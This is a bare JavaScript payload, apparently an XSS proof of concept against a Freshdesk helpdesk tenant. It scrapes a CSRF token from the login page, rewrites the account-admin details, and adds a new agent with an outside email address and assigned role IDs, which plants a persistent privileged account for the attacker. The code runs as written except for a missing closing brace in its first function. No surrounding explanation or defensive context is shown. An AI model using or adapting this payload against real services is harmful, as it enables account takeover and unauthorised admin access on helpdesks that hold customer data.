async function getCsrfToken() {
    const response = await fetch('https://usnavneel.freshdesk.com/support/login')
    const text = await response.text();
    const parser = new DOMParser();
    const doc = parser.parseFromString(text, 'text/html');
    const meta = doc.querySelector('meta[name="csrf-token"]');
    return meta ? meta.getAttribute('content') : null;
async function updateAccountAdmin(csrfToken) {
    const url = 'https://usnavneel.freshdesk.com/api/_/account_admin';
    const data = {
        first_name: "XSS",
        last_name: "attack",
        phone: 1111111111,
        company_name: "Navneel xss company"
};
    const response = await fetch(url, {
        method: 'PUT',
        headers: {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json; charset=utf-8',
            'X-Csrf-Token': csrfToken,
            'X-Requested-With': 'XMLHttpRequest'
},
        body: JSON.stringify(data)
    });
    return response.json();
}
async function addAgent(csrfToken) {
    const url = 'https://usnavneel.freshdesk.com/api/_/agents';
    const data = {
        name: "Navneel XSS",
        email: "rishu_xss@yahoo.com",
        phone: "",
        mobile: "",
        time_zone: "Eastern Time (US & Canada)",
        job_title: "",
        language: "en",
        ticket_scope: 1,
        role_ids: [154000059877, 154000059876],
        occasional: false,
        signature: ""
};
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json; charset=utf-8',
            'X-Csrf-Token': csrfToken,
            'X-Requested-With': 'XMLHttpRequest'
},
        body: JSON.stringify(data)
    });
    return response.json();
}
async function processRequests() {
    const csrfToken = await getCsrfToken();
    if (!csrfToken) {
        console.error('Failed to retrieve CSRF token.');
        return;
}
    const updateResponse = await updateAccountAdmin(csrfToken);
    console.log("Update Response:", updateResponse);
    const addAgentResponse = await addAgent(csrfToken);
    console.log("Add Agent Response:", addAgentResponse);
}
processRequests();
